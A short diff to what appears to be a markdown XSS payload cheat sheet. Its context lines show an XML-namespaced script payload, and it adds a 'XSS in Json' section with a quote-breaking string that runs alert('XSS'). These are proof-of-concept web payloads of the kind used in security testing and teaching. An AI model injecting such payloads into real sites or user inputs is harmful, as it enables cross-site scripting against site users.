@@ -141,3 +141,8 @@ can also work with single quotes (change it in the payload)
 ```xml
 <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(document.domain)</a:script>
 ```
+
+## XSS in Json
+```text
+["');alert('XSS');//"]@xyz.xxx
+```
